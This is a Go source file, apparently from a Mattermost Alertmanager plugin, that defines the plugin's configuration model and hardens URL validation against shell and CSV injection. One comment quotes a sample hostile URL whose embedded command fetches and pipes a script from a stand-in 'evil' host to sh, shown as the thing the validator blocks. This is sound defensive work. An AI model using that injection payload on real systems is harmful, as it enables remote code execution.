package main

import (
	"encoding/json"
	"errors"
	"fmt"
	neturl "net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// rawConfiguration is what Mattermost's settings framework fills in from the
// plugin's System Console settings_schema.
//
// The receiver list (alertConfig entries) is deliberately NOT here: it holds
// webhook IDs and Alertmanager basic-auth passwords, and anything in the plugin
// config map is readable via GET /api/v4/config by delegated console roles
// (sysconsole_read_plugins) unless flagged secret. It lives in the plugin KV
// store instead (kvKeyAlertConfigs), which the config API does not expose. See
// loadAlertConfigsFromKV (read) and updateConfigsAtomic (write) (CL-19).
//
// WebhookHost is the optional override for the host:port portion of the
// Mattermost webhook URL when rendered into alertmanager.yml. See
// plugin.json settings_schema for the full rationale. Empty = fall back
// to SiteURL.
//
// WebhookHostPreset is the System Console dropdown of known-good hosts for
// common setups (Docker Desktop, default-namespace K8s). It and WebhookHost
// are collapsed into a single effective value by resolveWebhookHost — a
// free-text WebhookHost always wins, so existing installs and custom URLs
// are unaffected.
type rawConfiguration struct {
	WebhookHost           string
	WebhookHostPreset     string
	AssembledYAMLTTLHours int
	AlertManagerCABundle  string
	MetricsToken          string
	WebhookRotationDays   int
}

// kvKeyAlertConfigs is the plugin KV-store key holding the JSON-serialized
// receiver list. The KV store is not surfaced by GET /api/v4/config, so the
// webhook IDs and Alertmanager passwords in these entries are not readable by
// delegated console roles the way a plugin-config value would be (CL-19). The
// :v1 suffix leaves room to change the on-disk shape without a key collision.
const kvKeyAlertConfigs = "alertconfigs:v1"

// maxReceivers caps the total number of registered receivers across the whole
// install (CL-25). Every write re-marshals and re-validates the entire list, and
// each entry re-verifies its team on the next config change — so an unbounded
// list turns each subsequent write into an O(N) tax (O(N^2) to build up), bloats
// the cluster-broadcast KV value, and slows the reconciler. Set far above any
// real deployment (30 runbooks across a generous channel count) so genuine use
// never hits it, but a scripted flood is stopped. Enforced in the add path.
const maxReceivers = 2000

// enforceReceiverCap returns an error when appending `adding` receivers to a list
// that already holds `existing` would exceed maxReceivers (CL-25). Called inside
// the add transforms so the check runs against the freshly-read KV count.
func enforceReceiverCap(existing, adding int) error {
	if existing+adding > maxReceivers {
		return fmt.Errorf("receiver limit reached (%d registered, cap %d) — remove some before adding more", existing, maxReceivers)
	}
	return nil
}

// configuration is the parsed, validated, ready-to-serve plugin state.
// AlertConfigs is the active list; nameIndex provides O(1) lookup for
// slash commands that need to resolve an entry by name.
type configuration struct {
	AlertConfigs          []alertConfig
	WebhookHost           string
	AssembledYAMLTTLHours int
	AlertManagerCABundle  string
	MetricsToken          string
	WebhookRotationDays   int
	nameIndex             map[string]int
}

// alertConfig describes one Alertmanager backend bound to a Mattermost channel
// via a native incoming webhook.
//
// The plugin's job is to create the Mattermost incoming webhook (owned by the
// bot user, not the calling admin) and store its ID here. Alertmanager posts
// directly to that webhook via `slack_configs`; the plugin never sees the
// alert payload at runtime. The only runtime usage of these fields is for
// slash commands like /alertmanager render and /alertmanager alerts.
//
// Notably absent vs. the cpanato plugin: no Token field. Authentication of
// inbound alerts is whatever Mattermost's native incoming webhook system
// uses (the random hook-id in the URL). The plugin owns no shared secrets.
//
// Webhook sharing (v1.0.3+): multiple alertConfig entries may share a single
// WebhookID when they were created in the same /alertmanager add invocation.
// Group adds (e.g., `add ... compute`) produce N receivers all pointing at
// one Mattermost webhook. Individual slug adds (e.g., `add ... high-cpu-usage`)
// produce a single receiver with its own webhook. The GroupName field
// disambiguates and enables refcount-based cleanup on remove. Pre-v1.0.3
// receivers have empty GroupName and are treated as individual (each owns
// its webhook) for backwards compatibility.
type alertConfig struct {
	Name            string `json:"name"`
	Team            string `json:"team"`
	Channel         string `json:"channel"`
	AlertManagerURL string `json:"alertManagerURL,omitempty"`
	WebhookID       string `json:"webhookID"`

	// GroupName identifies the unit this receiver was created under.
	// Receivers sharing GroupName + Team + Channel also share WebhookID.
	// Values:
	//   - Category set keyword: "all", "compute", "application",
	//     "database", "networking", "observability", "storage"
	//   - Runbook slug: "high-cpu-usage", etc. — set when the receiver
	//     was created via an individual /alertmanager add <slug> call
	//   - Empty: legacy receiver from v1.0.0-v1.0.2 before group webhooks
	//     existed. Treated as individual for backwards compatibility.
	GroupName string `json:"groupName,omitempty"`

	// Custom marks a generic (non-runbook) receiver created via
	// /alertmanager add-custom. Its base slug is a user-chosen name rather than
	// a runbook slug, so the plugin does NOT auto-generate a `runbook=<slug>`
	// route for it — the user wires the matcher manually (see assembleRoutesYAML,
	// which emits a commented stub for these). Runbook diagnostics/links are
	// naturally empty since no runbook backs the name.
	Custom bool `json:"custom,omitempty"`

	// WebhookHostOverride lets a sysadmin pin a per-receiver host that
	// takes precedence over the global WebhookHost setting at YAML
	// render time. Set via /alertmanager add --webhook-host=<url>.
	// Use case: one Mattermost serving multiple K8s clusters where
	// each cluster's Alertmanager reaches MM via a different network
	// path. Empty = inherit global WebhookHost or fall back to SiteURL.
	WebhookHostOverride string `json:"webhookHostOverride,omitempty"`

	// Optional basic-auth credentials for outbound calls to Alertmanager's
	// REST API (used by /alertmanager alerts, silences, status). Not a
	// Mattermost user — these are service-account credentials for the
	// Alertmanager side. Leave empty unless your Alertmanager is behind an
	// auth proxy. NOT exposed via the /alertmanager add slash command. Since
	// CL-19 moved the receiver list to the KV store, the old config-JSON edit
	// path is gone; setting these now means writing the KV entry directly.
	// A dedicated slash flag is a possible future addition.
	User     string `json:"user,omitempty"`
	Password string `json:"password,omitempty"`

	// LastRotatedAt is when the WebhookID was last (re)created via
	// /alertmanager add or /alertmanager rotate. Used by the rotation
	// reminder scheduler — when the configured WebhookRotationDays
	// elapses since this timestamp, the plugin DMs sysadmins to
	// suggest rotation. Zero value (== time.Time{}) is treated as
	// "rotated at plugin upgrade time" by the reconciler, so
	// existing receivers don't immediately fire reminders after the
	// feature is enabled.
	LastRotatedAt time.Time `json:"lastRotatedAt,omitzero"`

	// LastReminderAt is when the most-recent rotation-due reminder
	// was sent for this receiver. Used to throttle repeats — the
	// reconciler skips re-reminding for the same receiver until
	// reminderRepeatInterval has elapsed since this timestamp.
	// Reset on rotation along with LastRotatedAt.
	LastReminderAt time.Time `json:"lastReminderAt,omitzero"`

	// RotationRemindersEnabled is the per-receiver opt-in for the
	// rotation reminder system. Set true at creation time via the
	// optional `on` arg to /alertmanager add. When false (default),
	// the reconciler skips this receiver in its reminder check even
	// if the global WebhookRotationDays threshold passes. Two-tier
	// design: sysadmin sets the threshold globally; channel-team-admin
	// opts INTO rotation per channel at add time.
	RotationRemindersEnabled bool `json:"rotationRemindersEnabled,omitempty"`
}

// Names are user-facing identifiers — URL-safe so they can appear in slash
// command args and YAML output without escaping concerns. The 190-char cap
// (up from 64) accommodates the team-qualified form <slug>--<team>-<channel>:
// a long runbook slug (~33) plus a 64-char team slug plus a 64-char channel
// slug plus separators tops out around 164, so 190 leaves headroom without an
// unbounded name. Alertmanager and the rendered YAML impose no tighter limit.
var alertConfigNameRegex = regexp.MustCompile(`^[a-z0-9][a-z0-9_-]{0,189}$`)

// IsValid enforces per-entry invariants. Name validation runs first so
// downstream errors can reference it.
func (ac *alertConfig) IsValid() error {
	if !alertConfigNameRegex.MatchString(ac.Name) {
		return fmt.Errorf("invalid name %q: must be 1-190 chars, start with [a-z0-9], remainder [a-z0-9_-]", ac.Name)
	}
	if ac.Team == "" {
		return errors.New("must set team")
	}
	if ac.Channel == "" {
		return errors.New("must set channel")
	}
	if ac.WebhookID == "" {
		return errors.New("must set webhookID (the plugin creates this; do not set manually)")
	}
	if (ac.User == "") != (ac.Password == "") {
		return errors.New("user and password must both be set or both be empty")
	}
	// CL-03/CL-21/CL-33: validate the URLs here so EVERY persist path — slash
	// command and a blob written straight to the KV store — is covered, not just
	// the /alertmanager add entry point.
	if err := validateAlertManagerURL(ac.AlertManagerURL); err != nil {
		return err
	}
	if err := validateWebhookHost(ac.WebhookHostOverride); err != nil {
		return fmt.Errorf("webhookHostOverride: %w", err)
	}
	return nil
}

// newConfiguration builds a configuration from validated entries and
// pre-computes the name index. Caller must have validated entries.
func newConfiguration(entries []alertConfig, webhookHost string, yamlTTLHours int, caBundle, metricsToken string, rotationDays int) *configuration {
	if yamlTTLHours < 0 {
		yamlTTLHours = 0
	}
	if rotationDays < 0 {
		rotationDays = 0
	}
	c := &configuration{
		AlertConfigs:          entries,
		WebhookHost:           strings.TrimRight(webhookHost, "/"),
		AssembledYAMLTTLHours: yamlTTLHours,
		AlertManagerCABundle:  caBundle,
		MetricsToken:          metricsToken,
		WebhookRotationDays:   rotationDays,
		nameIndex:             make(map[string]int, len(entries)),
	}
	for i, e := range entries {
		c.nameIndex[e.Name] = i
	}
	return c
}

// Clone deep-copies for safe atomic swap.
func (c *configuration) Clone() *configuration {
	cloned := make([]alertConfig, len(c.AlertConfigs))
	copy(cloned, c.AlertConfigs)
	return newConfiguration(cloned, c.WebhookHost, c.AssembledYAMLTTLHours, c.AlertManagerCABundle, c.MetricsToken, c.WebhookRotationDays)
}

// configMutex guards getConfiguration / setConfiguration. Embedded in Plugin
// rather than here to keep this file focused on the data model.

// alertManagerHostRegex matches the host of a legitimate Alertmanager base URL:
// a hostname or IP (IPv6 colons allowed; url.Hostname strips the brackets),
// nothing else. It deliberately excludes every shell metacharacter ($ ( ) ` ; |
// & and whitespace), which is what neutralizes a value like
// `http://am:9093$(curl${IFS}-s${IFS}http://evil|sh)` — that survives
// strings.Fields via ${IFS} and would otherwise be interpolated verbatim into
// the copy-paste `curl -X POST <url>/-/reload` fence and the CSV export (CL-03,
// CL-21).
var alertManagerHostRegex = regexp.MustCompile(`^[A-Za-z0-9.:-]+$`)

// alertManagerPathRegex restricts an optional reverse-proxy path prefix to a
// safe charset, so the path can't smuggle shell metacharacters into the reload
// command fence either.
var alertManagerPathRegex = regexp.MustCompile(`^[A-Za-z0-9._~/%-]+$`)

// validateAlertManagerURL rejects a malformed or dangerous AlertManagerURL. The
// value is attacker-influenceable (a team_admin sets it via /alertmanager add)
// and later renders into a copy-paste shell command a sysadmin runs and into a
// CSV a sysadmin opens — a cross-privilege, cross-context sink. Empty is valid
// (the URL is only needed for the alerts/silences/status commands).
//
// Accepted: http[s]://host[:port][/safe/path]. Rejected: other schemes, embedded
// credentials, query strings, fragments, and any character in the host or path
// outside the safe grammar above (which is where the shell/CSV injection lives).
func validateAlertManagerURL(raw string) error {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil
	}
	// Reject '?' and '#' via a STRING scan, BEFORE parsing — deliberately, not
	// via u.RawQuery/u.Fragment. url.Parse("http://h/x#") reports RawQuery=="" and
	// Fragment=="" for a TRAILING bare marker, so a component-only check misses it,
	// yet the plugin builds requests by concatenation (amURL + "/api/v2/alerts"),
	// so that trailing '#'/'?' silently truncates the appended path onto the wrong
	// endpoint. A base URL never legitimately carries either. (F-002, from PR #58's
	// review — kept alongside #57's stricter host/port/path grammar below.)
	if strings.ContainsAny(raw, "?#") {
		return errors.New("AlertManagerURL must not contain '?' or '#' — even a trailing one truncates the appended /api/v2/... path")
	}
	u, err := neturl.Parse(raw)
	if err != nil {
		return fmt.Errorf("AlertManagerURL is not a valid URL: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("AlertManagerURL must use http:// or https:// (got %q)", u.Scheme)
	}
	if u.User != nil {
		return fmt.Errorf("AlertManagerURL must not contain embedded credentials")
	}
	host := u.Hostname()
	if host == "" {
		return fmt.Errorf("AlertManagerURL has no host")
	}
	if !alertManagerHostRegex.MatchString(host) {
		return fmt.Errorf("AlertManagerURL host contains invalid characters")
	}
	if port := u.Port(); port != "" {
		if _, err := strconv.Atoi(port); err != nil {
			return fmt.Errorf("AlertManagerURL has a non-numeric port")
		}
	}
	// Query/fragment already rejected by the string scan above (which also
	// catches trailing bare markers a parsed check would miss).
	if u.Path != "" && u.Path != "/" && !alertManagerPathRegex.MatchString(u.Path) {
		return fmt.Errorf("AlertManagerURL path contains invalid characters")
	}
	return nil
}

// sanitizeAlertManagerURL is the LOAD-PATH counterpart to
// validateAlertManagerURL: it neuters a stored Alertmanager URL instead of
// rejecting it. Strips surrounding whitespace, the '?'/'#' tail (and everything
// after — the exploitable path-truncation vector), and any embedded credentials.
//
// Why neuter, not reject, on load: parseAlertConfigs's error propagates out of
// OnConfigurationChange, and an error there stops the plugin loading AT ALL. So
// a single bad stored value (a direct KV write, or a bug that slipped one past
// the /alertmanager add validation) would brick the whole plugin — turning F-002
// into a persistent denial of service. Sanitizing keeps the plugin up; the one
// affected receiver's alerts/status/silences queries stop working, which is a far
// smaller blast radius than a dead plugin. (F-002 hardening, from PR #58's review.)
//
// Anything sanitize can't rescue (no scheme, no host) is left for the caller to
// blank — it's inert (http.Client.Do fails on it, no SSRF value), not hostile.
func sanitizeAlertManagerURL(raw string) string {
	raw = strings.TrimSpace(raw)
	// Drop the '?'/'#' tail first so the exploitable truncation vector is gone
	// even if the remainder doesn't parse as a URL.
	if i := strings.IndexAny(raw, "?#"); i >= 0 {
		raw = raw[:i]
	}
	u, err := neturl.Parse(raw)
	if err != nil || u.User == nil {
		return raw
	}
	// Strip embedded credentials (basic-auth belongs in the user/password fields).
	u.User = nil
	return u.String()
}

// validateWebhookHost rejects malformed WebhookHost values at config
// save time. Sanity-checks defense-in-depth — sysadmins are trusted,
// but typos shouldn't propagate to alertmanager.yml.
//
// Accepted forms: http[s]://host[:port] (no path).
// Empty string is valid (means "fall back to SiteURL").
func validateWebhookHost(raw string) error {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil
	}
	u, err := neturl.Parse(raw)
	if err != nil {
		return fmt.Errorf("WebhookHost is not a valid URL: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("WebhookHost must use http:// or https:// (got %q)", u.Scheme)
	}
	if u.Host == "" {
		return fmt.Errorf("WebhookHost has no host portion")
	}
	if u.Path != "" && u.Path != "/" {
		return fmt.Errorf("WebhookHost must be a host:port only, no path (got %q)", u.Path)
	}
	if u.RawQuery != "" || u.Fragment != "" {
		return fmt.Errorf("WebhookHost cannot contain query string or fragment")
	}
	return nil
}

// resolveWebhookHost collapses the two System Console fields that can set the
// global webhook host into the single effective value the rest of the plugin
// uses (stored in configuration.WebhookHost, read by renderReceiverAPIURL).
// Precedence, most specific first:
//  1. WebhookHost (free text) — a value here always wins, so an existing
//     install's setting keeps working and a custom URL (e.g. a K8s service
//     DNS with a non-default namespace) overrides any preset.
//  2. WebhookHostPreset (dropdown) — a known-good constant for a common
//     setup (Docker Desktop, default-namespace K8s).
//  3. "" — neither set; callers fall back to SiteURL.
func resolveWebhookHost(custom, preset string) string {
	if c := strings.TrimSpace(custom); c != "" {
		return c
	}
	return strings.TrimSpace(preset)
}

// parseAlertConfigs decodes and validates the JSON blob. Surfaces byte
// offsets on syntax errors and entry indices on validation errors so an
// admin staring at a multi-screen JSON blob can find the typo.
func parseAlertConfigs(blob string) ([]alertConfig, error) {
	blob = strings.TrimSpace(blob)
	if blob == "" {
		return nil, nil
	}

	var entries []alertConfig
	if err := json.Unmarshal([]byte(blob), &entries); err != nil {
		var syntaxErr *json.SyntaxError
		if errors.As(err, &syntaxErr) {
			return nil, fmt.Errorf("AlertConfigsJSON syntax error at byte offset %d: %w", syntaxErr.Offset, err)
		}
		var typeErr *json.UnmarshalTypeError
		if errors.As(err, &typeErr) {
			return nil, fmt.Errorf("AlertConfigsJSON type error at byte offset %d (field %q): %w", typeErr.Offset, typeErr.Field, err)
		}
		return nil, fmt.Errorf("AlertConfigsJSON parse error: %w", err)
	}

	seenNames := make(map[string]struct{}, len(entries))
	// Track each webhookID's owner (team + channel + group) so we can
	// reject mismatches while allowing legitimate sharing across the
	// receivers in a single group/individual add invocation.
	type webhookOwner struct {
		team    string
		channel string
		group   string
	}
	seenWebhooks := make(map[string]webhookOwner, len(entries))
	for i := range entries {
		// Sanitize the Alertmanager URL BEFORE IsValid so a hostile or malformed
		// stored value is neutered, never rejected. IsValid (below) runs on the
		// load path, and any error it returns propagates out of
		// OnConfigurationChange and stops the plugin loading at all — so a single
		// bad stored URL must not fail the load, or F-002 becomes a persistent DoS.
		// Sanitize strips the exploitable parts; anything still failing the strict
		// validateAlertManagerURL check afterwards (no scheme / no host) is inert,
		// not hostile, so blank it. The /alertmanager add + add-custom entry points
		// still HARD-reject bad input up front, so this only fires on values that
		// bypassed them (direct KV write, future bug). (F-002, from PR #58's review.)
		amURL := strings.TrimRight(sanitizeAlertManagerURL(entries[i].AlertManagerURL), "/")
		if amURL != "" && validateAlertManagerURL(amURL) != nil {
			amURL = ""
		}
		entries[i].AlertManagerURL = amURL
		if err := entries[i].IsValid(); err != nil {
			return nil, fmt.Errorf("alertConfig[%d]: %w", i, err)
		}
		if _, dup := seenNames[entries[i].Name]; dup {
			return nil, fmt.Errorf("duplicate alertConfig name %q", entries[i].Name)
		}
		// WebhookID sharing constraint: receivers sharing a webhookID
		// must also share team + channel + groupName. Mismatches
		// indicate either operator error during a System Console
		// hand-edit or a bug in the plugin's own writes — reject at
		// parse time so the bad state can't activate.
		owner := webhookOwner{
			team:    entries[i].Team,
			channel: entries[i].Channel,
			group:   entries[i].GroupName,
		}
		if existing, seen := seenWebhooks[entries[i].WebhookID]; seen {
			if existing != owner {
				// Redact the webhook ID (a bearer token) — this error surfaces to the
				// admin and the logs (CL-13). The conflict is already identifiable by
				// name + team/channel/group; the fingerprint just correlates the two
				// entries that collide.
				return nil, fmt.Errorf("alertConfig[%d] name=%q: webhook %s is shared with a receiver in team=%q channel=%q group=%q; sharing requires matching team+channel+group (got team=%q channel=%q group=%q)",
					i, entries[i].Name, redactHookID(entries[i].WebhookID),
					existing.team, existing.channel, existing.group,
					owner.team, owner.channel, owner.group)
			}
		} else {
			seenWebhooks[entries[i].WebhookID] = owner
		}
		seenNames[entries[i].Name] = struct{}{}
	}
	return entries, nil
}

// loadAlertConfigsFromKV reads and validates the receiver list from the plugin
// KV store (CL-19). An absent key (fresh install, or nothing added yet) is not
// an error — it returns an empty list. Parse/validation errors ARE surfaced so a
// corrupt blob fails the config swap loudly rather than silently dropping
// receivers.
//
// Intentional clean break, NOT a bug: the receiver list moved from the plugin
// config map to the KV store with NO migration reader. An install upgrading from
// a config-map build therefore comes up with an empty list and re-adds its
// receivers via /alertmanager add. This is a deliberate dev/redeploy boundary
// (see the BREAKING CHANGE note and docs/CONFIGURATION.md); a migration shim was
// explicitly out of scope. Do not "fix" this by reading the old config value.
func (p *Plugin) loadAlertConfigsFromKV() ([]alertConfig, error) {
	data, appErr := p.API.KVGet(kvKeyAlertConfigs)
	if appErr != nil {
		return nil, fmt.Errorf("read receiver list from KV: %w", appErr)
	}
	if len(data) == 0 {
		return nil, nil
	}
	return parseAlertConfigs(string(data))
}

// configurationLock-aware helpers live on *Plugin.

// getConfiguration is defined as a method on *Plugin in plugin.go to keep
// the lock there with the lock state itself. Same for setConfiguration.

// OnConfigurationChange is the Mattermost hook for any settings update.
// Reads the JSON blob, validates, ensures destination teams exist (channels
// are auto-managed by the webhook system), and atomically swaps the runtime
// configuration.
//
// Does NOT call OnActivate — bot setup and command registration are
// one-time-per-process work owned by OnActivate.
func (p *Plugin) OnConfigurationChange() error {
	var raw rawConfiguration
	if err := p.API.LoadPluginConfiguration(&raw); err != nil {
		return fmt.Errorf("load plugin configuration: %w", err)
	}

	// Collapse the preset dropdown + free-text field into one effective host,
	// then validate that — a preset is known-good, but a free-text override
	// still needs the sanity check.
	effectiveHost := resolveWebhookHost(raw.WebhookHost, raw.WebhookHostPreset)
	if err := validateWebhookHost(effectiveHost); err != nil {
		return err
	}

	// Receiver list comes from the KV store, not the config map (CL-19). KVGet
	// needs a live API, so skip it when the API isn't wired yet (early startup /
	// tests) — an empty list matches the prior behavior of an empty config blob.
	var entries []alertConfig
	if p.API != nil {
		var err error
		if entries, err = p.loadAlertConfigsFromKV(); err != nil {
			return err
		}
		// Verify each DISTINCT team once (CL-25). Many entries share a team
		// (all the runbooks scaffolded into one channel), and OnConfigurationChange
		// fires on every config change — an unmemoized GetTeamByName per entry made
		// each write O(N) plugin-RPC calls. Memoizing makes it O(distinct teams).
		verifiedTeams := make(map[string]bool)
		for _, ac := range entries {
			if verifiedTeams[ac.Team] {
				continue
			}
			_, appErr := p.API.GetTeamByName(ac.Team)
			if appErr == nil {
				verifiedTeams[ac.Team] = true
				continue
			}
			// Tolerate transient errors (typically during early startup
			// before the API is fully ready). Hard-fail only on real 404s.
			if appErr.StatusCode == 404 {
				return fmt.Errorf("alertConfig %q: Mattermost team %q does not exist", ac.Name, ac.Team)
			}
			// Transient error (typically MM not fully ready). Mark the team seen
			// anyway so the remaining receivers in the SAME team don't each repeat
			// the failing RPC — that per-entry O(N) call/log storm during a MM
			// outage is exactly what this memo exists to prevent. Logged once here.
			p.API.LogWarn("could not verify team existence (continuing)", "config", ac.Name, "team", ac.Team, "err", appErr.Error())
			verifiedTeams[ac.Team] = true
		}
	}

	p.setConfiguration(newConfiguration(entries, effectiveHost, raw.AssembledYAMLTTLHours, raw.AlertManagerCABundle, raw.MetricsToken, raw.WebhookRotationDays))
	// Refresh the alertmanager package's HTTP client to use the new
	// CA bundle (if set). Applied on every config change so admins
	// can rotate certificates without a plugin restart.
	p.updateAlertmanagerHTTPClient(raw.AlertManagerCABundle)
	return nil
}
